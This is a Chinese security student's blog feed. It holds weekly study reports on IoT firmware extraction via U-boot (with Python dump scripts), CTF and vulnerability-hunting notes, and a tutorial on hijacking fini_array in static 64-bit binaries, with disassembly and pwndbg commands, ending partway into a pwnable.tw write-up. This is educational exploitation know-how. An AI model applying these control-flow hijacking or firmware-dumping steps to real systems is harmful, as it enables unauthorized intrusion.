title="总结"></a>总结</h3><p>这周都在等esp32到，再补作业，没啥好说的….，不过拿到了串口的shell，不错不错。</p><h1 id="二一年十二月周报（四）"><a href="#二一年十二月周报（四）" class="headerlink" title="二一年十二月周报（四）"></a>二一年十二月周报（四）</h1><h3 id="上周学习回顾（12-13-12-19）："><a href="#上周学习回顾（12-13-12-19）：" class="headerlink" title="上周学习回顾（12.13-12.19）："></a>上周学习回顾（12.13-12.19）：</h3><p>学习内容：</p><ul><li>配置ESP32的环境（12.13-12.17）</li><li>做课程设计（12.18）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度差</em></p></li></ul><h3 id="下周学习计划-11"><a href="#下周学习计划-11" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-13"><a href="#总结-13" class="headerlink" title="总结"></a>总结</h3><p>周报模板再次更新，加入更精确的时间来检查学习的进度，这周主要还是再弄ESP32，终于配好了，一路踩坑，一路填坑，最终搭建好了环境，下周继续完善相关的内容，之前的CNVD通过审核了，虽说很拉，但至少也算是自己的第一个CNVD了，可喜可贺，继续加油！愈发感觉要想再往上走需要更多的开发能力才行，后面开始安排开发相关的任务才行。</p><h1 id="十二月月报"><a href="#十二月月报" class="headerlink" title="十二月月报"></a>十二月月报</h1><blockquote><p>十二月也来了，一年也结束啦~</p></blockquote><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p>发现人要多出去走走看，就会发现这个世界的美好</p><h4 id="小喜事-2"><a href="#小喜事-2" class="headerlink" title="小喜事"></a>小喜事</h4><ul><li>获得CNVD的证书</li><li>即将拿到天问实验室的offer</li><li>跟澳哥去打创安杯</li></ul><h4 id="小难受-2"><a href="#小难受-2" class="headerlink" title="小难受"></a>小难受</h4><ul><li>挖不到漏洞啊….</li><li>情绪很不稳定</li></ul><h4 id="小目标-2"><a href="#小目标-2" class="headerlink" title="小目标"></a>小目标</h4><p>在此学期内成功挖掘出漏洞！！！，还是这个目标就看能不能完成了，就剩下一个月了</p><h4 id="总结-14"><a href="#总结-14" class="headerlink" title="总结"></a>总结</h4><p>慢慢的也有了自己的人脉，很感慨吧！一路走来，一点点的积累和进步，除了上周的低危CNVD，可能暂时挖不出什么更好的漏洞了，这也是没有办法的事情，挖洞其实不难，难就难在坚持，代码你肯不肯一点点的去审，接口你肯不肯一点点的去调试，多想！肯定能挖出来的！</p><h1 id="二二年一月周报（一）"><a href="#二二年一月周报（一）" class="headerlink" title="二二年一月周报（一）"></a>二二年一月周报（一）</h1><h3 id="上周学习回顾（12-20-12-26）："><a href="#上周学习回顾（12-20-12-26）：" class="headerlink" title="上周学习回顾（12.20-12.26）："></a>上周学习回顾（12.20-12.26）：</h3><p>学习内容：</p><ul><li>完成BLE_CTF的内容（12.20-12.21）</li><li>打创安杯（12.22-12.24）</li><li>复习课程内容（12.25-12.26）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-12"><a href="#下周学习计划-12" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-15"><a href="#总结-15" class="headerlink" title="总结"></a>总结</h3><p>这周自己慢慢摸索BLE_CTF怎么写，也完成了一大半辽，之后就是有幸和澳哥一起打创安杯，最后虽然没拿到奖，不过也算是获得一段难忘的路程吧！接下来就是复习考试，准备飞杭州~，开启人生新篇章！</p><h1 id="二二年一月周报（二）"><a href="#二二年一月周报（二）" class="headerlink" title="二二年一月周报（二）"></a>二二年一月周报（二）</h1><h3 id="上周学习回顾（12-27-1-2）："><a href="#上周学习回顾（12-27-1-2）：" class="headerlink" title="上周学习回顾（12.27-1.2）："></a>上周学习回顾（12.27-1.2）：</h3><p>学习内容：</p><ul><li>复习课程内容（12.27-1.2）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-13"><a href="#下周学习计划-13" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>完成<code>kernel pwn</code>，加深对内核的理解（优先级：2）</li><li>尝试完成BLE CTF的相关内容（优先级：1）</li><li>JTAG？？？（隐藏任务）</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-16"><a href="#总结-16" class="headerlink" title="总结"></a>总结</h3><p>复习周略….</p><h1 id="二二年一月周报（三）"><a href="#二二年一月周报（三）" class="headerlink" title="二二年一月周报（三）"></a>二二年一月周报（三）</h1><h3 id="上周学习回顾（1-3-1-9）："><a href="#上周学习回顾（1-3-1-9）：" class="headerlink" title="上周学习回顾（1.3-1.9）："></a>上周学习回顾（1.3-1.9）：</h3><p>学习内容：</p><ul><li>重新搭建python的知识框架（1.3-1.9）</li></ul><p>get到的小tips：</p><ul><li><p>无</p><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-14"><a href="#下周学习计划-14" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>实习中…..</li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h3><p>这周已经放假了，重新看看python，代码的功底还是挺重要的！！！</p><h1 id="二二年一月周报（四）"><a href="#二二年一月周报（四）" class="headerlink" title="二二年一月周报（四）"></a>二二年一月周报（四）</h1><h3 id="上周学习回顾（1-10-1-16）："><a href="#上周学习回顾（1-10-1-16）：" class="headerlink" title="上周学习回顾（1.10-1.16）："></a>上周学习回顾（1.10-1.16）：</h3><p>学习内容：</p><ul><li><p>日门铃所意识到自我的不足，以及看师傅的一些做法带来的启发（1.10-1.14）</p></li><li><p>U-boot的启动机制以及作用等内容（1.15-1.16）</p></li><li><p>在U-boot中提取固件（1.13）</p><ul><li><p>通过mem的这条shell命令循环打印，最后将日志保存：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Main</span>():</span></span><br><span class="line">    start=<span class="number">0x0</span></span><br><span class="line">    length=<span class="number">0x200000</span>-<span class="number">0x15200</span></span><br><span class="line">    base=<span class="number">0xbc000000</span>+<span class="number">0x15200</span></span><br><span class="line">    flag=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        <span class="keyword">if</span> length &gt; <span class="number">0x4000</span>:</span><br><span class="line">            shell = <span class="string">&quot;mem -dump &quot;</span>+<span class="built_in">hex</span>(base+start)+<span class="string">&quot; &quot;</span>+<span class="built_in">hex</span>(<span class="number">0x4000</span>)</span><br><span class="line">        <span class="keyword">elif</span> length &gt; <span class="number">0</span>:</span><br><span class="line">            shell = <span class="string">&quot;mem -dump &quot;</span>+<span class="built_in">hex</span>(base+start)+<span class="string">&quot; &quot;</span>+<span class="built_in">hex</span>(length)</span><br><span class="line">            flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        xsh.Screen.Send(shell+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        start = start+<span class="number">0x4000</span></span><br><span class="line">        length=length-<span class="number">0x4000</span></span><br><span class="line">        xsh.Screen.WaitForString(<span class="string">&quot;\n# &quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>最后将导出的log通过脚本转换成.bin文件（有个疑问就是直接跑会报错，原因是.log文件最开始有不可见字符导致的，解决方法暂时不详）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;***.log&quot;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">file_o = <span class="built_in">open</span>(<span class="string">&#x27;***&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">line_start = <span class="built_in">len</span>(<span class="string">&#x27;BC000000: &#x27;</span>)</span><br><span class="line">line_end = line_start+<span class="built_in">len</span>(<span class="string">&#x27;FF 00 00 10 00 00 00 00 - FD 00 00 10 00 00 00 00&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    lines = file.readlines(<span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> lines:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">&#x27;BC&#x27;</span>):</span><br><span class="line">            line = line[line_start:line_end]</span><br><span class="line">            line = line.replace(<span class="string">&#x27; - &#x27;</span>,<span class="string">&#x27; &#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                    tmp += <span class="number">0</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>))</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line">            file_o.write(tmp)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">file.close()</span><br><span class="line">file_o.close()</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>get到的小tips：</p><ul><li><p>芯片手册的查找</p><ul><li>具体的芯片没找到的时候，去找找公司名称没准有新发现</li></ul></li><li><p><strong>dd</strong>提取uImage中的kernel</p><ul><li>```<br>dd if=EN25QH128A_20220111_174555.BIN of=kernel.bin ibs=1024  skip=00x430200 count=2752 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 反编译apk成java代码，寻找有无设备的敏感信息，接口信息，升级固件地址信息等等</span><br><span class="line"></span><br><span class="line">  - [Android逆向系列（一）：初探Android逆向](https://blog.csdn.net/micaaa/article/details/82426710)</span><br><span class="line"></span><br><span class="line">- 树莓派配网</span><br><span class="line"></span><br><span class="line">  - [树莓派配置网络](https://blog.csdn.net/u010013028/article/details/106340105)</span><br><span class="line">  - [树莓派连接无线网络配置方法](http://www.shumeipaiba.com/wanpai/jiaocheng/25.html)</span><br><span class="line"></span><br><span class="line">- U-boot的源码下载的ftp地址为：`ftp://ftp.denx.de/pub/u-boot/`</span><br><span class="line"></span><br><span class="line">- ARM汇编小知识：</span><br><span class="line"></span><br><span class="line">  - b和bl汇编指令的区别：b相当于C中的goto指令，指的是直接跳转，而bl呢，是在跳转的过程之前，将下一条指令的地址放入lr寄存器当中，再进行跳转，待等会返回的时候就根据lr寄存器当中的值来返回（`mov pc,lr`）</span><br><span class="line"></span><br><span class="line">    ```assembly</span><br><span class="line">    0000breset;直接跳转至reset</span><br><span class="line">    ...</span><br><span class="line">    reset:</span><br><span class="line">    000cblsave_boot_params ;&lt;=当执行到这条命令的时候，会将0010的值放入lr寄存器</span><br><span class="line">    </span><br><span class="line">    0010mrsr0, cpsr</span><br><span class="line">    0014bicr0, r0, </span><br><span class="line">    0018orrr0, r0, </span><br><span class="line">    001cmsrcpsr,r0</span><br></pre></td></tr></table></figure></li></ul></li><li><p>汇编伪指令的文档：<a href="https://sourceware.org/binutils/docs-2.37/as/index.html#SEC_Contents">https://sourceware.org/binutils/docs-2.37/as/index.html#SEC_Contents</a></p></li><li><p>计算机体系结构：</p><ul><li><p>哈佛体系和冯诺依曼体系机构</p><ul><li><p><a href="https://blog.csdn.net/do2jiang/article/details/4545690">冯诺依曼体系结构、哈佛体系结构与改进型哈佛结构之间的区别</a></p><p>两者结构的最大区别就在于程序指令和数据是否分离开来，两者都各有利弊，都有某个特别突出的缺点，所以在现代的计算机都会采用两者结合的技术，在CPU外采用冯诺依曼的体系结构，而在CPU内部采用哈佛的体系结构</p></li></ul></li></ul><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-15"><a href="#下周学习计划-15" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>CVE-2021-42342 GoAhead远程命令执行(暂时弄不来)<ul><li>前提：Burp的使用….. &amp;&amp; 环境变量注入</li><li>目的：了解GoAhead开源的嵌入式webserver的框架以及CGI协议的一些原理</li></ul></li><li>U-boot(得等板子买了再重新学)<ul><li><a href="https://github.com/yifengyou/jz2440">ARM体系结构学习+ARM U-boot+Linux内核+Linux驱动</a></li><li><a href="https://www.bilibili.com/video/BV1D4411W73j?p=1">看懂U-boot的神秘面容</a></li></ul></li><li>fuzz协议 &amp;&amp; fuzz二进制程序<ul><li><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/">IoT设备固件分析之网络协议fuzz</a></li><li><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">Boofuzz协议漏洞挖掘入门教程与使用心得</a></li><li><a href="https://bestestredteam.com/2020/10/28/boofuzz/">Boofuzz：怪异的 HTTP 模糊测试</a></li></ul></li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-18"><a href="#总结-18" class="headerlink" title="总结"></a>总结</h3><p>来到天问的第一周，就开始日门铃，救命，没弄过这种奇奇怪怪的设备，真·坐牢，不过看着它们测也有学到一点点的东西，视野倒是开拓了不少，不在局限与路由器的破解当中，其他的设备也是可以玩玩的，也挺好！</p><h1 id="二二年二月周报（一）"><a href="#二二年二月周报（一）" class="headerlink" title="二二年二月周报（一）"></a>二二年二月周报（一）</h1><h3 id="上周学习回顾（1-17-1-23）："><a href="#上周学习回顾（1-17-1-23）：" class="headerlink" title="上周学习回顾（1.17-1.23）："></a>上周学习回顾（1.17-1.23）：</h3><p>学习内容：</p><ul><li>web常见的漏洞 &amp;&amp; burp的使用</li><li>VxWorks等实时操作系统的固件修复</li></ul><p>get到的小tips：</p><ul><li><p>用强光照射板子可以看到MCU接出来的阵脚是接到那里</p><ul><li><a href="https://dalpix.com/reverse-engineering-ip-camera-part-2">逆向工程 IP 摄像机 - 第 2 部分</a></li></ul></li><li><p>shadow文件各个字段的解释</p><ul><li><pre><code class="bash">root:x:0:0:99999:7:::用户名：密码：修改时间：修改时间间隔：密码有效期：...</code></pre><p><a href="http://c.biancheng.net/view/840.html">Linux /etc/shadow内容解析</a></p></li></ul></li><li><p>Ghidra的Cheat Sheet :<a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p></li><li></li><li></li><li></li><li><p>———-<em>上周计划是否完成：完成程度一般</em></p></li></ul><h3 id="下周学习计划-16"><a href="#下周学习计划-16" class="headerlink" title="下周学习计划"></a>下周学习计划</h3><ul><li>CVE-2021-42342 GoAhead远程命令执行(暂时弄不来)<ul><li>前提：Burp的使用….. &amp;&amp; 环境变量注入</li><li>目的：了解GoAhead开源的嵌入式webserver的框架以及CGI协议的一些原理</li></ul></li><li>U-boot(得等板子买了再重新学)<ul><li><a href="https://github.com/yifengyou/jz2440">ARM体系结构学习+ARM U-boot+Linux内核+Linux驱动</a></li><li><a href="https://www.bilibili.com/video/BV1D4411W73j?p=1">看懂U-boot的神秘面容</a></li></ul></li><li>fuzz协议 &amp;&amp; fuzz二进制程序<ul><li><a href="https://cq674350529.github.io/2019/03/31/IoT%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AEfuzz/">IoT设备固件分析之网络协议fuzz</a></li><li><a href="https://blog.csdn.net/weixin_46222091/article/details/119334375">Boofuzz协议漏洞挖掘入门教程与使用心得</a></li><li><a href="https://bestestredteam.com/2020/10/28/boofuzz/">Boofuzz：怪异的 HTTP 模糊测试</a></li></ul></li></ul><p>PS：优先级越小代表任务越重要！</p><h3 id="总结-19"><a href="#总结-19" class="headerlink" title="总结"></a>总结</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>64位静态程序fini劫持</title>
      <link href="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/"/>
      <url>/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote><p>在64位的静态程序当中，除了<code>ret2syscall</code>，又碰到了静态程序的万能<code>gadget————fini</code>，<code>fini</code>是个什么东西呢？回想之前的《main真的是函数入口吗？》，在程序进入和退出都会调用函数来帮忙初始化和善后，它们分别是<code>__libc_csu_init</code>和<code>__libc_csu_fini</code>，后者就是今天我们要谈论的函数。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>用《main真的是函数入口吗？》里面<code>exit</code>的<code>demo</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><p>IDA打开直接定位<code>__libc_cus_fini</code>函数，里面有三条语句特别的关键：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401910 __libc_csu_fini proc near               ; DATA XREF: _start+F↑o</span><br><span class="line">.text:0000000000401910 ; __unwind &#123;</span><br><span class="line">.text:0000000000401910                 push    rbp</span><br><span class="line">.text:0000000000401911                 lea     rax, __gettext_germanic_plural</span><br><span class="line">.text:0000000000401918                 lea     rbp, _fini_array_0</span><br><span class="line">.text:000000000040191F                 push    rbx</span><br><span class="line">.text:0000000000401920                 sub     rax, rbp</span><br><span class="line">.text:0000000000401923                 sar     rax, 3</span><br><span class="line">.text:0000000000401927                 sub     rsp, 8</span><br><span class="line">.text:000000000040192B                 test    rax, rax</span><br><span class="line">.text:000000000040192E                 jz      short loc_401946</span><br><span class="line">.text:0000000000401930                 lea     rbx, [rax-1]</span><br><span class="line">.text:0000000000401934                 nop     dword ptr [rax+00h]</span><br><span class="line">.text:0000000000401938</span><br><span class="line">.text:0000000000401938 loc_401938:                             ; CODE XREF: __libc_csu_fini+34↓j</span><br><span class="line">.text:0000000000401938                 call   qword ptr [rbp + rbx*8]</span><br><span class="line">.text:000000000040193C                 sub     rbx, 1</span><br><span class="line">.text:0000000000401940                 cmp     rbx, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:0000000000401944                 jnz     short loc_401938</span><br><span class="line">.text:0000000000401946</span><br><span class="line">.text:0000000000401946 loc_401946:                             ; CODE XREF: __libc_csu_fini+1E↑j</span><br><span class="line">.text:0000000000401946                 add     rsp, 8</span><br><span class="line">.text:000000000040194A                 pop     rbx</span><br><span class="line">.text:000000000040194B                 pop     rbp</span><br><span class="line">.text:000000000040194C                 jmp     _term_proc</span><br><span class="line">.text:000000000040194C ; &#125; // starts at 401910</span><br><span class="line">.text:000000000040194C __libc_csu_fini endp</span><br></pre></td></tr></table></figure><p>注意下面三条语句，它将是我们利用的关键，通过理解<code>__libc_csu_fini</code>的执行流程，可以总结出它是先将<code>_fini_array_0</code>这个数组的地址赋值给<code>rbp</code>，之后通过<code>call</code>来调用，那它是怎么调用的呢？下面展示动调的过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401918                 lea     rbp, _fini_array_0</span><br><span class="line">.text:0000000000401938                 call   qword ptr [rbp + rbx*8]</span><br><span class="line">.text:0000000000401944                 jnz     short loc_401938</span><br></pre></td></tr></table></figure><p>在<code>__libc_csu_fini</code>下断点，<code>c</code>之后步入之后来到<code>0x401938</code>，可以看到它正常的调用了<code>_fini_array_0</code>，调用返回之后会将<code>sub     rbx, 1</code>（此前<code>rbx</code>的值为<code>1</code>），再往下就是<code>cmp rbx, 0FFFFFFFFFFFFFFFFh</code>，这里显然不等于，并触发跳转，程序又回到了刚刚的位置再一次<code>call qword ptr [rbp + rbx*8]</code>，需要注意的是这次的<code>call</code>索引的值不同了，之后<code>rbx</code>减<code>1</code>，未能触发跳转，看完动调的过程，我们总结一下它执行的流程为<code>_fini_array[1] -&gt; _fini_array[0]</code>。</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/1.jpg" class=""><p>知道了它的执行流程之后，那么怎么去利用它呢？并且<code>_fini_array[1]</code>和<code>_fini_array[0]</code>里面到底存的是什么呢？我们可以<code>objdump</code>看一下<code>fini_array</code>这个数组存放的位置，再用<code>gdb</code>来看看<code>fini_array</code>里面到底存的是什么？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  test objdump -h ./exit </span><br><span class="line"></span><br><span class="line">./exit：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">节：</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">                  </span><br><span class="line"> 16 .fini_array   00000010  00000000006b6150  00000000006b6150  000b6150  2**3</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure><p>在下图可以看到<code>_fini_array[0] =&gt; __do_global_dtors_aux </code>和 <code>_fini_array[1] =&gt; fini</code>， 那我们如果改<code>_fini_array[0]</code>是不是就能劫持控制流了？答案是肯定的！</p><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/2.png" class=""><h5 id="劫持-fini-array-0"><a href="#劫持-fini-array-0" class="headerlink" title="劫持_fini_array[0]"></a>劫持_fini_array[0]</h5><p>修改<code>main真的是函数入口吗？</code>里面<code>exit</code>的<code>demo</code>为下面的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hack</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;welcome to hacker world\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><p>还是在<code>__libc_csu_fini</code>下断点，修改<code>_fini_array[0]</code>的值为<code>hack</code>函数的地址，再按下<code>c</code>的时候，我们已经成功的打印了<code>welcome to hacker world\n</code>！！！这里修改的只是<code>hack</code>函数的地址，那如果是<code>one_gadget</code>或者是<code>shellcode</code>的地址，你应该能猜到会发生什么。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p hack</span><br><span class="line">$2 = &#123;&lt;text variable, no debug info&gt;&#125; 0x400b6d &lt;hack&gt;</span><br><span class="line">pwndbg&gt; set &#123;int&#125;0x6b6150=0x400b6d</span><br></pre></td></tr></table></figure><img src="/2021/10/22/64%E4%BD%8D%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8Ffini%E5%8A%AB%E6%8C%81/3.png" class=""><p>可遗憾的是，只有一些特定的情况才能像上面那样利用，接下来将介绍更通用的情况：</p><h5 id="libc-csu-fini的循环"><a href="#libc-csu-fini的循环" class="headerlink" title="__libc_csu_fini的循环"></a>__libc_csu_fini的循环</h5><p>既然它会循环调用，那不然就让它一直循环吧！我们将<code>_fini_array[1]</code>改成某个函数的地址（下面都称它为A），同时再把<code>_fini_array[0]</code>改成<code>__libc_csu_fini</code>的地址，由于它每次<code>call</code>完<code>_fini_array[0]</code>都回到<code>__libc_csu_fini</code>函数的开头，所以<code>ebx</code>永远都不会等于<code>-1</code>，那么程序的执行流将变成下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__libc_csu_fini -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini  -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini -&gt; fini_array[1]:addrA -&gt; fini_array[0]:__libc_csu_fini -&gt; .....</span><br></pre></td></tr></table></figure><p>除非把<code>fini_array[0]</code>覆盖成其他的值，否则它将一直循环到天荒地老，那么这么循环到底有什么用呢？答：进行ROP攻击，我们可以在<code>fini_array+0x10</code>布置ROP，然后再将栈迁移到这里，最终实现我们的目的！讲的再多不如来道题目看看~</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><h5 id="3x17"><a href="#3x17" class="headerlink" title="3x17"></a>3x17</h5><p><a href="https://pwnable.tw/challenge/">题目链接</a></p><p>打开IDA就得知这是一个静态的64位的程序，下面的<code>checksec</code>就开了<code>NX</code>：</p><figure class="highlight 